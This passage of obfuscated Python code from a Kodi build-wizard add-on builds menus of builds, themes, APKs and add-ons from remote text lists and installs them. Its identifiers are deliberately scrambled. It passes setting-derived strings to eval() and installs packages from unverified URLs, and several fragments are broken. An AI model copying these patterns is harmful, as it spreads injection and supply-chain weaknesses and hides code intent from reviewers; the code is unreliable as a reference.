	(O00OOO00O0O0000O0 )#line:2209
	O000OO0O0O0OO0O0O =(wiz .workingURL (O00OOO00O0O0000O0 ))#line:2210
	(O000OO0O0O0OO0O0O )#line:2211
	O000OO0O0O0OO0O0O =wiz .workingURL (SPEEDFILE )#line:2212
	if not O000OO0O0O0OO0O0O ==True :#line:2213
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2214
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2215
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2216
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2217
		addFile ('%s'%O000OO0O0O0OO0O0O ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2218
	else :#line:2219
		OO000000OO0O0OOOO ,O000OOOO0000OO000 ,OO0O000OO00OO0000 ,O00OO0000O000O00O ,OO0O0OOOO00O0O00O ,OOOO0OOO00O00O00O ,O000O0O0OO0OOOO00 =wiz .buildCount ()#line:2220
		O0O000OOOO0O0O0O0 =False ;O0000O00O0OOOO000 =[]#line:2221
		if THIRDPARTY =='true':#line:2222
			if not THIRD1NAME ==''and not THIRD1URL =='':O0O000OOOO0O0O0O0 =True ;O0000O00O0OOOO000 .append ('1')#line:2223
			if not THIRD2NAME ==''and not THIRD2URL =='':O0O000OOOO0O0O0O0 =True ;O0000O00O0OOOO000 .append ('2')#line:2224
			if not THIRD3NAME ==''and not THIRD3URL =='':O0O000OOOO0O0O0O0 =True ;O0000O00O0OOOO000 .append ('3')#line:2225
		O0O00OO0O0O0O0O00 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2226
		OO00O000OOO0OO0OO =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O00OO0O0O0O0O00 )#line:2227
		if OO000000OO0O0OOOO ==1 and O0O000OOOO0O0O0O0 ==False :#line:2228
			for O00O00O0O0OOO0O0O ,OO00O0OOO0OOO000O ,OOO00OO00OO0O0000 ,O0O0O00O0O0OOO0OO ,OOO0OO00O0O0OOOO0 ,OOO0O0000O0OOO00O ,OOO0OO0O00000O00O ,O0O00000O0OO0O00O ,OOO0OOOO0O0OO0000 ,O0OOO0O00O000O0O0 in OO00O000OOO0OO0OO :#line:2229
				if not SHOWADULT =='true'and OOO0OOOO0O0OO0000 .lower ()=='yes':continue #line:2230
				if not DEVELOPER =='true'and wiz .strTest (O00O00O0O0OOO0O0O ):continue #line:2231
				viewBuild (OO00O000OOO0OO0OO [0 ][0 ])#line:2232
				return #line:2233
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2236
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2237
		if O0O000OOOO0O0O0O0 ==True :#line:2238
			for O0OOOO00000OOOOO0 in O0000O00O0OOOO000 :#line:2239
				O00O00O0O0OOO0O0O =eval ('THIRD%sNAME'%O0OOOO00000OOOOO0 )#line:2240
		if len (OO00O000OOO0OO0OO )>=1 :#line:2242
			if SEPERATE =='true':#line:2243
				for O00O00O0O0OOO0O0O ,OO00O0OOO0OOO000O ,OOO00OO00OO0O0000 ,O0O0O00O0O0OOO0OO ,OOO0OO00O0O0OOOO0 ,OOO0O0000O0OOO00O ,OOO0OO0O00000O00O ,O0O00000O0OO0O00O ,OOO0OOOO0O0OO0000 ,O0OOO0O00O000O0O0 in OO00O000OOO0OO0OO :#line:2244
					if not SHOWADULT =='true'and OOO0OOOO0O0OO0000 .lower ()=='yes':continue #line:2245
					if not DEVELOPER =='true'and wiz .strTest (O00O00O0O0OOO0O0O ):continue #line:2246
					O0OO00OOOOO0OO000 =createMenu ('install','',O00O00O0O0OOO0O0O )#line:2247
					addDir ('[%s] %s (v%s)'%(float (OOO0OO00O0O0OOOO0 ),O00O00O0O0OOO0O0O ,OO00O0OOO0OOO000O ),'viewbuild',O00O00O0O0OOO0O0O ,description =O0OOO0O00O000O0O0 ,fanart =O0O00000O0OO0O00O ,icon =OOO0OO0O00000O00O ,menu =O0OO00OOOOO0OO000 ,themeit =THEME2 )#line:2248
			else :#line:2249
				if O00OO0000O000O00O >0 :#line:2250
					O0O00O0OOOOO0000O ='+'if SHOW17 =='false'else '-'#line:2251
					if SHOW17 =='true':#line:2253
						for O00O00O0O0OOO0O0O ,OO00O0OOO0OOO000O ,OOO00OO00OO0O0000 ,O0O0O00O0O0OOO0OO ,OOO0OO00O0O0OOOO0 ,OOO0O0000O0OOO00O ,OOO0OO0O00000O00O ,O0O00000O0OO0O00O ,OOO0OOOO0O0OO0000 ,O0OOO0O00O000O0O0 in OO00O000OOO0OO0OO :#line:2255
							if not SHOWADULT =='true'and OOO0OOOO0O0OO0000 .lower ()=='yes':continue #line:2256
							if not DEVELOPER =='true'and wiz .strTest (O00O00O0O0OOO0O0O ):continue #line:2257
							OO0O00O0O00OOOOO0 =int (float (OOO0OO00O0O0OOOO0 ))#line:2258
							if OO0O00O0O00OOOOO0 ==17 :#line:2259
								O0OO00OOOOO0OO000 =createMenu ('install','',O00O00O0O0OOO0O0O )#line:2260
								addDir ('[%s] %s (v%s)'%(float (OOO0OO00O0O0OOOO0 ),O00O00O0O0OOO0O0O ,OO00O0OOO0OOO000O ),'viewbuild',O00O00O0O0OOO0O0O ,description =O0OOO0O00O000O0O0 ,fanart =O0O00000O0OO0O00O ,icon =OOO0OO0O00000O00O ,menu =O0OO00OOOOO0OO000 ,themeit =THEME2 )#line:2261
				if OO0O0OOOO00O0O00O >0 :#line:2262
					O0O00O0OOOOO0000O ='+'if SHOW18 =='false'else '-'#line:2263
					if SHOW18 =='true':#line:2265
						for O00O00O0O0OOO0O0O ,OO00O0OOO0OOO000O ,OOO00OO00OO0O0000 ,O0O0O00O0O0OOO0OO ,OOO0OO00O0O0OOOO0 ,OOO0O0000O0OOO00O ,OOO0OO0O00000O00O ,O0O00000O0OO0O00O ,OOO0OOOO0O0OO0000 ,O0OOO0O00O000O0O0 in OO00O000OOO0OO0OO :#line:2267
							if not SHOWADULT =='true'and OOO0OOOO0O0OO0000 .lower ()=='yes':continue #line:2268
							if not DEVELOPER =='true'and wiz .strTest (O00O00O0O0OOO0O0O ):continue #line:2269
							OO0O00O0O00OOOOO0 =int (float (OOO0OO00O0O0OOOO0 ))#line:2270
							if OO0O00O0O00OOOOO0 ==18 :#line:2271
								O0OO00OOOOO0OO000 =createMenu ('install','',O00O00O0O0OOO0O0O )#line:2272
								addDir ('[%s] %s (v%s)'%(float (OOO0OO00O0O0OOOO0 ),O00O00O0O0OOO0O0O ,OO00O0OOO0OOO000O ),'viewbuild',O00O00O0O0OOO0O0O ,description =O0OOO0O00O000O0O0 ,fanart =O0O00000O0OO0O00O ,icon =OOO0OO0O00000O00O ,menu =O0OO00OOOOO0OO000 ,themeit =THEME2 )#line:2273
				if OO0O000OO00OO0000 >0 :#line:2274
					O0O00O0OOOOO0000O ='+'if SHOW16 =='false'else '-'#line:2275
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O0O00O0OOOOO0000O ,OO0O000OO00OO0000 ),'togglesetting','show16',themeit =THEME3 )#line:2276
					if SHOW16 =='true':#line:2277
						for O00O00O0O0OOO0O0O ,OO00O0OOO0OOO000O ,OOO00OO00OO0O0000 ,O0O0O00O0O0OOO0OO ,OOO0OO00O0O0OOOO0 ,OOO0O0000O0OOO00O ,OOO0OO0O00000O00O ,O0O00000O0OO0O00O ,OOO0OOOO0O0OO0000 ,O0OOO0O00O000O0O0 in OO00O000OOO0OO0OO :#line:2278
							if not SHOWADULT =='true'and OOO0OOOO0O0OO0000 .lower ()=='yes':continue #line:2279
							if not DEVELOPER =='true'and wiz .strTest (O00O00O0O0OOO0O0O ):continue #line:2280
							OO0O00O0O00OOOOO0 =int (float (OOO0OO00O0O0OOOO0 ))#line:2281
							if OO0O00O0O00OOOOO0 ==16 :#line:2282
								O0OO00OOOOO0OO000 =createMenu ('install','',O00O00O0O0OOO0O0O )#line:2283
								addDir ('[%s] %s (v%s)'%(float (OOO0OO00O0O0OOOO0 ),O00O00O0O0OOO0O0O ,OO00O0OOO0OOO000O ),'viewbuild',O00O00O0O0OOO0O0O ,description =O0OOO0O00O000O0O0 ,fanart =O0O00000O0OO0O00O ,icon =OOO0OO0O00000O00O ,menu =O0OO00OOOOO0OO000 ,themeit =THEME2 )#line:2284
				if O000OOOO0000OO000 >0 :#line:2285
					O0O00O0OOOOO0000O ='+'if SHOW15 =='false'else '-'#line:2286
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O0O00O0OOOOO0000O ,O000OOOO0000OO000 ),'togglesetting','show15',themeit =THEME3 )#line:2287
					if SHOW15 =='true':#line:2288
						for O00O00O0O0OOO0O0O ,OO00O0OOO0OOO000O ,OOO00OO00OO0O0000 ,O0O0O00O0O0OOO0OO ,OOO0OO00O0O0OOOO0 ,OOO0O0000O0OOO00O ,OOO0OO0O00000O00O ,O0O00000O0OO0O00O ,OOO0OOOO0O0OO0000 ,O0OOO0O00O000O0O0 in OO00O000OOO0OO0OO :#line:2289
							if not SHOWADULT =='true'and OOO0OOOO0O0OO0000 .lower ()=='yes':continue #line:2290
							if not DEVELOPER =='true'and wiz .strTest (O00O00O0O0OOO0O0O ):continue #line:2291
							OO0O00O0O00OOOOO0 =int (float (OOO0OO00O0O0OOOO0 ))#line:2292
							if OO0O00O0O00OOOOO0 <=15 :#line:2293
								O0OO00OOOOO0OO000 =createMenu ('install','',O00O00O0O0OOO0O0O )#line:2294
								addDir ('[%s] %s (v%s)'%(float (OOO0OO00O0O0OOOO0 ),O00O00O0O0OOO0O0O ,OO00O0OOO0OOO000O ),'viewbuild',O00O00O0O0OOO0O0O ,description =O0OOO0O00O000O0O0 ,fanart =O0O00000O0OO0O00O ,icon =OOO0OO0O00000O00O ,menu =O0OO00OOOOO0OO000 ,themeit =THEME2 )#line:2295
		elif O000O0O0OO0OOOO00 >0 :#line:2296
			if OOOO0OOO00O00O00O >0 :#line:2297
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2298
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2299
			else :#line:2300
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2301
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2302
	setView ('files','viewType')#line:2303
def viewBuild (O00OOOOOOOOO0O000 ):#line:2305
	O0O000O0OOO00OOOO =wiz .workingURL (SPEEDFILE )#line:2306
	if not O0O000O0OOO00OOOO ==True :#line:2307
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2308
		addFile ('%s'%O0O000O0OOO00OOOO ,'',themeit =THEME3 )#line:2309
		return #line:2310
	if wiz .checkBuild (O00OOOOOOOOO0O000 ,'version')==False :#line:2311
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2312
		addFile ('%s was not found in the builds list.'%O00OOOOOOOOO0O000 ,'',themeit =THEME3 )#line:2313
		return #line:2314
	OO0O0O0O0O0OO00OO =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2315
	O00O0OOO0OO0O0000 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O00OOOOOOOOO0O000 ).findall (OO0O0O0O0O0OO00OO )#line:2316
	for O0000O00000O0O0OO ,O00OO000OOO0O0O0O ,O0O0OOO00OOOOOO00 ,O0O0O0O0OOOOOO0OO ,O00OO0000O0OO0OOO ,O0OO00OOO0OO0000O ,O00OOOO000OOO0OO0 ,O0OO000000OO00OO0 ,OO0OOOO00O0O000O0 ,OOOO00OO0OOOOOOOO in O00O0OOO0OO0O0000 :#line:2317
		O0OO00OOO0OO0000O =O0OO00OOO0OO0000O if wiz .workingURL (O0OO00OOO0OO0000O )else ICON #line:2318
		O00OOOO000OOO0OO0 =O00OOOO000OOO0OO0 if wiz .workingURL (O00OOOO000OOO0OO0 )else FANART #line:2319
		OO000O0O0OOOO000O ='%s (v%s)'%(O00OOOOOOOOO0O000 ,O0000O00000O0O0OO )#line:2320
		if BUILDNAME ==O00OOOOOOOOO0O000 and O0000O00000O0O0OO >BUILDVERSION :#line:2321
			OO000O0O0OOOO000O ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OO000O0O0OOOO000O ,BUILDVERSION )#line:2322
		O00OO00OO0O0OOOOO =int (float (KODIV ));O0O0OO0O0OOOOO0OO =int (float (O0O0O0O0OOOOOO0OO ))#line:2331
		if not O00OO00OO0O0OOOOO ==O0O0OO0O0OOOOO0OO :#line:2332
			if O00OO00OO0O0OOOOO ==16 and O0O0OO0O0OOOOO0OO <=15 :O00OO0OO0000O0O00 =False #line:2333
			else :O00OO0OO0000O0O00 =True #line:2334
		else :O00OO0OO0000O0O00 =False #line:2335
		addFile ('התקנה','install',O00OOOOOOOOO0O000 ,'fresh',description =OOOO00OO0OOOOOOOO ,fanart =O00OOOO000OOO0OO0 ,icon =O0OO00OOO0OO0000O ,themeit =THEME1 )#line:2339
		if not O00OO0000O0OO0OOO =='http://':#line:2342
			if wiz .workingURL (O00OO0000O0OO0OOO )==True :#line:2343
				addFile (wiz .sep ('THEMES'),'',fanart =O00OOOO000OOO0OO0 ,icon =O0OO00OOO0OO0000O ,themeit =THEME3 )#line:2344
				OO0O0O0O0O0OO00OO =wiz .openURL (O00OO0000O0OO0OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2345
				O00O0OOO0OO0O0000 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0O0O0O0O0OO00OO )#line:2346
				for OO000O0000O0OO00O ,O0O00O00O0OOO0OO0 ,O000000O000O0OOOO ,OOO0OOO0OOOO000OO ,O00OOO000OOO00OO0 ,OOOO00OO0OOOOOOOO in O00O0OOO0OO0O0000 :#line:2347
					if not SHOWADULT =='true'and O00OOO000OOO00OO0 .lower ()=='yes':continue #line:2348
					O000000O000O0OOOO =O000000O000O0OOOO if O000000O000O0OOOO =='http://'else O0OO00OOO0OO0000O #line:2349
					OOO0OOO0OOOO000OO =OOO0OOO0OOOO000OO if OOO0OOO0OOOO000OO =='http://'else O00OOOO000OOO0OO0 #line:2350
					addFile (OO000O0000O0OO00O if not OO000O0000O0OO00O ==BUILDTHEME else "[B]%s (Installed)[/B]"%OO000O0000O0OO00O ,'theme',O00OOOOOOOOO0O000 ,OO000O0000O0OO00O ,description =OOOO00OO0OOOOOOOO ,fanart =OOO0OOO0OOOO000OO ,icon =O000000O000O0OOOO ,themeit =THEME3 )#line:2351
	setView ('files','viewType')#line:2352
def viewThirdList (OO0OOOOO000OOOOO0 ):#line:2354
	O0O00O00O00OOO0O0 =eval ('THIRD%sNAME'%OO0OOOOO000OOOOO0 )#line:2355
	O0OOOOOO0O0OO0000 =eval ('THIRD%sURL'%OO0OOOOO000OOOOO0 )#line:2356
	OO0O000OO00OOOO00 =wiz .workingURL (O0OOOOOO0O0OO0000 )#line:2357
	if not OO0O000OO00OOOO00 ==True :#line:2358
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2359
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2360
	else :#line:2361
		OO0O0O0OOO00OO0OO ,O0O00000O00OOO0O0 =wiz .thirdParty (O0OOOOOO0O0OO0000 )#line:2362
		addFile ("[B]%s[/B]"%O0O00O00O00OOO0O0 ,'',themeit =THEME3 )#line:2363
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2364
		if OO0O0O0OOO00OO0OO :#line:2365
			for O0O00O00O00OOO0O0 ,OOOO0O000OO0OOOOO ,O0OOOOOO0O0OO0000 ,O000O0O0O00OO00O0 ,OO00OOO0O00O0O000 ,O000OOO0O0OOOOOOO ,O00OOO0OO00O0OOO0 ,OOOOOO0O00OO0O000 in O0O00000O00OOO0O0 :#line:2366
				if not SHOWADULT =='true'and O00OOO0OO00O0OOO0 .lower ()=='yes':continue #line:2367
				addFile ("[%s] %s v%s"%(O000O0O0O00OO00O0 ,O0O00O00O00OOO0O0 ,OOOO0O000OO0OOOOO ),'installthird',O0O00O00O00OOO0O0 ,O0OOOOOO0O0OO0000 ,icon =OO00OOO0O00O0O000 ,fanart =O000OOO0O0OOOOOOO ,description =OOOOOO0O00OO0O000 ,themeit =THEME2 )#line:2368
		else :#line:2369
			for O0O00O00O00OOO0O0 ,O0OOOOOO0O0OO0000 ,OO00OOO0O00O0O000 ,O000OOO0O0OOOOOOO ,OOOOOO0O00OO0O000 in O0O00000O00OOO0O0 :#line:2370
				addFile (O0O00O00O00OOO0O0 ,'installthird',O0O00O00O00OOO0O0 ,O0OOOOOO0O0OO0000 ,icon =OO00OOO0O00O0O000 ,fanart =O000OOO0O0OOOOOOO ,description =OOOOOO0O00OO0O000 ,themeit =THEME2 )#line:2371
def editThirdParty (O0OO000O00O00OO0O ):#line:2373
	OOO00O0O0OOOOO0O0 =eval ('THIRD%sNAME'%O0OO000O00O00OO0O )#line:2374
	O0OOO0O00O00OOO00 =eval ('THIRD%sURL'%O0OO000O00O00OO0O )#line:2375
	OOO0O00O0O00000OO =wiz .getKeyboard (OOO00O0O0OOOOO0O0 ,'Enter the Name of the Wizard')#line:2376
	O0OOOOOOO00O0000O =wiz .getKeyboard (O0OOO0O00O00OOO00 ,'Enter the URL of the Wizard Text')#line:2377
	wiz .setS ('wizard%sname'%O0OO000O00O00OO0O ,OOO0O00O0O00000OO )#line:2379
	wiz .setS ('wizard%surl'%O0OO000O00O00OO0O ,O0OOOOOOO00O0000O )#line:2380
def apkScraper (name =""):#line:2382
	if name =='kodi':#line:2383
		OO0OO0OO00OO0OO00 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2384
		OOOO0OOO0O0OO000O ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2385
		OO0O00OOOO00OO00O =wiz .openURL (OO0OO0OO00OO0OO00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2386
		OOO00O00O0OOO000O =wiz .openURL (OOOO0OOO0O0OO000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2387
		O00000000O00OOO00 =0 #line:2388
		OOO0000O0000OO0OO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO0O00OOOO00OO00O )#line:2389
		O0O00O0OO0000O0O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOO00O00O0OOO000O )#line:2390
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2392
		O0O0O00O0O0OOO0O0 =False #line:2393
		for OO00O000OOO000000 ,name ,OO00O00O0OO0O000O ,O0000OOO0OO0OOO0O in OOO0000O0000OO0OO :#line:2394
			if OO00O000OOO000000 in ['../','old/']:continue #line:2395
			if not OO00O000OOO000000 .endswith ('.apk'):continue #line:2396
			if not OO00O000OOO000000 .find ('_')==-1 and O0O0O00O0O0OOO0O0 ==True :continue #line:2397
			try :#line:2398
				O00O000OOOO0O0OO0 =name .split ('-')#line:2399
				if not OO00O000OOO000000 .find ('_')==-1 :#line:2400
					O0O0O00O0O0OOO0O0 =True #line:2401
					OOO00O000OO0OO0OO ,OO000OO000O0OOOOO =O00O000OOOO0O0OO0 [2 ].split ('_')#line:2402
				else :#line:2403
					OOO00O000OO0OO0OO =O00O000OOOO0O0OO0 [2 ]#line:2404
					OO000OO000O0OOOOO =''#line:2405
				O0O0O0O00O00O00OO ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O000OOOO0O0OO0 [0 ].title (),O00O000OOOO0O0OO0 [1 ],OO000OO000O0OOOOO .upper (),OOO00O000OO0OO0OO ,COLOR2 ,OO00O00O0OO0O000O .replace (' ',''),COLOR1 ,O0000OOO0OO0OOO0O )#line:2406
				O0O000O000O0O0O0O =urljoin (OO0OO0OO00OO0OO00 ,OO00O000OOO000000 )#line:2407
				addFile (O0O0O0O00O00O00OO ,'apkinstall',"%s v%s%s %s"%(O00O000OOOO0O0OO0 [0 ].title (),O00O000OOOO0O0OO0 [1 ],OO000OO000O0OOOOO .upper (),OOO00O000OO0OO0OO ),O0O000O000O0O0O0O )#line:2408
				O00000000O00OOO00 +=1 #line:2409
			except :#line:2410
				wiz .log ("Error on: %s"%name )#line:2411
		for OO00O000OOO000000 ,name ,OO00O00O0OO0O000O ,O0000OOO0OO0OOO0O in O0O00O0OO0000O0O0 :#line:2413
			if OO00O000OOO000000 in ['../','old/']:continue #line:2414
			if not OO00O000OOO000000 .endswith ('.apk'):continue #line:2415
			if not OO00O000OOO000000 .find ('_')==-1 :continue #line:2416
			try :#line:2417
				O00O000OOOO0O0OO0 =name .split ('-')#line:2418
				O0O0O0O00O00O00OO ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O000OOOO0O0OO0 [0 ].title (),O00O000OOOO0O0OO0 [1 ],O00O000OOOO0O0OO0 [2 ],COLOR2 ,OO00O00O0OO0O000O .replace (' ',''),COLOR1 ,O0000OOO0OO0OOO0O )#line:2419
				O0O000O000O0O0O0O =urljoin (OOOO0OOO0O0OO000O ,OO00O000OOO000000 )#line:2420
				addFile (O0O0O0O00O00O00OO ,'apkinstall',"%s v%s %s"%(O00O000OOOO0O0OO0 [0 ].title (),O00O000OOOO0O0OO0 [1 ],O00O000OOOO0O0OO0 [2 ]),O0O000O000O0O0O0O )#line:2421
				O00000000O00OOO00 +=1 #line:2422
			except :#line:2423
				wiz .log ("Error on: %s"%name )#line:2424
		if O00000000O00OOO00 ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2425
	elif name =='spmc':#line:2426
		OO0O00O0OOO00O0O0 ='https://github.com/koying/SPMC/releases'#line:2427
		OO0O00OOOO00OO00O =wiz .openURL (OO0O00O0OOO00O0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2428
		O00000000O00OOO00 =0 #line:2429
		OOO0000O0000OO0OO =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OO0O00OOOO00OO00O )#line:2430
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2432
		for name ,OOO0000OO00O00OOO in OOO0000O0000OO0OO :#line:2434
			OO0OOOOOO0000000O =''#line:2435
			O0O00O0OO0000O0O0 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OOO0000OO00O00OOO )#line:2436
			for O000O0000O0OO0OOO ,OO00000000OOO00OO ,OO00OO0000000O0O0 in O0O00O0OO0000O0O0 :#line:2437
				if OO00OO0000000O0O0 .find ('armeabi')==-1 :continue #line:2438
				if OO00OO0000000O0O0 .find ('launcher')>-1 :continue #line:2439
				OO0OOOOOO0000000O =urljoin ('https://github.com',O000O0000O0OO0OOO )#line:2440
				break #line:2441
		if O00000000O00OOO00 ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2443
def apkMenu (url =None ):#line:2445
	if url ==None :#line:2446
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2449
	if not APKFILE =='http://':#line:2450
		if url ==None :#line:2451
			O000O0OO0O0OO0O00 =wiz .workingURL (APKFILE )#line:2452
			O00OO0OO000O00O00 =uservar .APKFILE #line:2453
		else :#line:2454
			O000O0OO0O0OO0O00 =wiz .workingURL (url )#line:2455
			O00OO0OO000O00O00 =url #line:2456
		if O000O0OO0O0OO0O00 ==True :#line:2457
			O0000O00O0000O0OO =wiz .openURL (O00OO0OO000O00O00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2458
			OOO0OO00OOO000O00 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0000O00O0000O0OO )#line:2459
			if len (OOO0OO00OOO000O00 )>0 :#line:2460
				OO0O00O00O0O0OOOO =0 #line:2461
				for OO0OOO0OOO0O00OOO ,OOOO0OOOO000OO00O ,url ,O00O0O000O0OOO0OO ,O0OOO0O0OOO0OO000 ,OOO0OO0000OOO000O ,OOOOOO0OOO0O00O0O in OOO0OO00OOO000O00 :#line:2462
					if not SHOWADULT =='true'and OOO0OO0000OOO000O .lower ()=='yes':continue #line:2463
					if OOOO0OOOO000OO00O .lower ()=='yes':#line:2464
						OO0O00O00O0O0OOOO +=1 #line:2465
						addDir ("[B]%s[/B]"%OO0OOO0OOO0O00OOO ,'apk',url ,description =OOOOOO0OOO0O00O0O ,icon =O00O0O000O0OOO0OO ,fanart =O0OOO0O0OOO0OO000 ,themeit =THEME3 )#line:2466
					else :#line:2467
						OO0O00O00O0O0OOOO +=1 #line:2468
						addFile (OO0OOO0OOO0O00OOO ,'apkinstall',OO0OOO0OOO0O00OOO ,url ,description =OOOOOO0OOO0O00O0O ,icon =O00O0O000O0OOO0OO ,fanart =O0OOO0O0OOO0OO000 ,themeit =THEME2 )#line:2469
					if OO0O00O00O0O0OOOO <1 :#line:2470
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2471
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2472
		else :#line:2473
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2474
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2475
			addFile ('%s'%O000O0OO0O0OO0O00 ,'',themeit =THEME3 )#line:2476
		return #line:2477
	else :wiz .log ("[APK Menu] No APK list added.")#line:2478
	setView ('files','viewType')#line:2479
def addonMenu (url =None ):#line:2481
	if not ADDONFILE =='http://':#line:2482
		if url ==None :#line:2483
			O0OOO00O000OOOO0O =wiz .workingURL (ADDONFILE )#line:2484
			O000OOO0O000O0000 =uservar .ADDONFILE #line:2485
		else :#line:2486
			O0OOO00O000OOOO0O =wiz .workingURL (url )#line:2487
			O000OOO0O000O0000 =url #line:2488
		if O0OOO00O000OOOO0O ==True :#line:2489
			OO000O0O00O0000OO =wiz .openURL (O000OOO0O000O0000 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2490
			OOO0O00O00OO000O0 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO000O0O00O0000OO )#line:2491
			if len (OOO0O00O00OO000O0 )>0 :#line:2492
				OOOO0O0OOOO0O0OOO =0 #line:2493
				for O000O0OOOOOO000OO ,OO0OOO00O00O00OO0 ,url ,OO000O0O00O0OO0O0 ,O0000O0O0OOO0OO00 ,OOOO0O0O000OO00OO ,O00O000OO00OO0O00 ,OOOO0OOOO0O0OOO00 ,OO00OOO0O0OOO000O ,OOO00OOO0OO00O00O in OOO0O00O00OO000O0 :#line:2494
					if OO0OOO00O00O00OO0 .lower ()=='section':#line:2495
						OOOO0O0OOOO0O0OOO +=1 #line:2496
						addDir ("[B]%s[/B]"%O000O0OOOOOO000OO ,'addons',url ,description =OOO00OOO0OO00O00O ,icon =O00O000OO00OO0O00 ,fanart =OOOO0OOOO0O0OOO00 ,themeit =THEME3 )#line:2497
					else :#line:2498
						if not SHOWADULT =='true'and OO00OOO0O0OOO000O .lower ()=='yes':continue #line:2499
						try :#line:2500
							O0000OOOO00OOOOOO =xbmcaddon .Addon (id =OO0OOO00O00O00OO0 ).getAddonInfo ('path')#line:2501
							if os .path .exists (O0000OOOO00OOOOOO ):#line:2502
								O000O0OOOOOO000OO ="[COLOR green][Installed][/COLOR] %s"%O000O0OOOOOO000OO #line:2503
						except :#line:2504
							pass #line:2505
						OOOO0O0OOOO0O0OOO +=1 #line:2506
						addFile (O000O0OOOOOO000OO ,'addoninstall',OO0OOO00O00O00OO0 ,O000OOO0O000O0000 ,description =OOO00OOO0OO00O00O ,icon =O00O000OO00OO0O00 ,fanart =OOOO0OOOO0O0OOO00 ,themeit =THEME2 )#line:2507
					if OOOO0O0OOOO0O0OOO <1 :#line:2508
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2509
			else :#line:2510
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2511
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2512
		else :#line:2513
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2514
